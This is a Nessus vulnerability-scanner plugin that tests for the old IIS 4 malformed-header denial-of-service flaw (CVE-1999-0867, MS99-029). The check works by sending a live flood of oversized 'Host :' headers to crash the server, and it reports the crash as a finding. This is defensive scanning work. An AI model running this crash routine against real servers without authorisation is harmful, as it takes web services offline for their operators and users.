#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(10119);
 script_version("$Revision: 1.47 $");
 script_cvs_date("$Date: 2014/05/26 00:33:32 $");

 script_cve_id("CVE-1999-0867");
 script_bugtraq_id(579);
 script_osvdb_id(1041);
 script_xref(name:"MSFT", value:"MS99-029");

 script_name(english:"Microsoft IIS Malformed HTTP Request Header Remote DoS");
 script_summary(english:"Performs a denial of service against IIS");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a remote denial of service
vulnerability.");
 script_set_attribute(attribute:"description", value:
"It was possible to crash the remote web server by sending a malformed
header request. This flaw allows an attacker to shut down your web
server, thus preventing legitimate users from connecting to your web
server.");
 script_set_attribute(attribute:"see_also", value:"http://technet.microsoft.com/en-us/security/bulletin/ms99-029");
 script_set_attribute(attribute:"solution", value:"Apply the patch referenced above.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"false");
 script_cwe_id(20);

 script_set_attribute(attribute:"vuln_publication_date", value:"1999/08/11");
 script_set_attribute(attribute:"plugin_publication_date", value:"1999/08/20");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:microsoft:iis");
 script_end_attributes();

 script_category(ACT_DENIAL);	# ACT_FLOOD?
 script_family(english:"Web Servers");
 script_copyright(english:"This script is Copyright (C) 1999-2014 Tenable Network Security, Inc.");

 script_dependencie("find_service1.nasl", "http_version.nasl", "www_fingerprinting_hmap.nasl");
 script_require_keys("Settings/ParanoidReport");
 script_require_ports("Services/www", 80);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_http_port(default:80);
banner = get_http_banner(port:port);
if ("Microsoft-IIS/4" >!< banner ) exit(0);

if (http_is_dead(port: port)) exit(1, "the web server is dead");

data = 'GET / HTTP/1.1\r\n';
crp  = 'Host : ' + crap(200) + '\r\n';

soc = http_open_socket(port);
if (! soc) exit(1, "port "+port+" is closed or filtered");

for (pass = 0; pass < 2; pass ++)
{
  send(socket:soc, data:data);

  for (j = 0; j < 10000; j++)
    if (send(socket:soc, data:crp) <= 0)
      break;
  send(socket:soc, data: '\r\n\r\n');
  http_close_socket(soc);
  sleep(2);
  soc = http_open_socket(port);
  if (! soc)
  {
    if (http_is_dead(port: port)) security_warning(port);
    exit(0);
   }
}
http_close_socket(soc);
